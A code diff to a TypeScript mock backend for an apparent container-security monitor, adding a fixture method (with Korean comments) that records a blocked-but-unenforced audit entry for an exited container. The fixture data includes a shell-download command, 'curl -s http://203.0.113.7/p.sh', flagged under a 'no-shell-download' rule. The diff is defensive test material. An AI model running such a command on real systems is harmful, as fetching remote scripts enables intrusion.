@@ -559,6 +559,18 @@ export class MockBackend {
     if (r && row5?.timeline) r.timeline = row5.timeline;
     return this;
   }
+  // 11/16: 이미 끝난 컨테이너의 격리 대상 기록 하나를 맨 위에 더한다 — pause 가 「not running」이라 격리 아님 + 사유,
+  // 타임라인은 증거 시각만(정지 · 격리 · 알림 없음, 백엔드 enforcer.KillTimed). 더한 감사 id 를 돌려준다
+  exitedBeforeKill(): number {
+    const ctr = 'sg-install-pip-1792043500-0016';
+    const v = kill(ev(this.now, 30, ctr, PYIMG, { kind: 'exec', comm: 'curl', args: 'curl -s http://203.0.113.7/p.sh' }), 'no-shell-download', '셸 다운로더');
+    v.enforced = false;
+    v.enforceError = 'container is not running';
+    v.timeline = timeline(Date.parse(v.event.timestamp), { killMs: null, notifyMs: null, evidenceStartMs: 14, evidenceDoneMs: 96 });
+    const id = Math.max(0, ...this.audit.map((a) => a.id)) + 1;
+    this.audit.unshift({ ...v, id, caseId: null, install: null });
+    return id;
+  }
   // 10/30: 시연 켜기(/api/info.demo = true + /api/demo 경로)
   enableDemo() {
     this.info.demo = true;
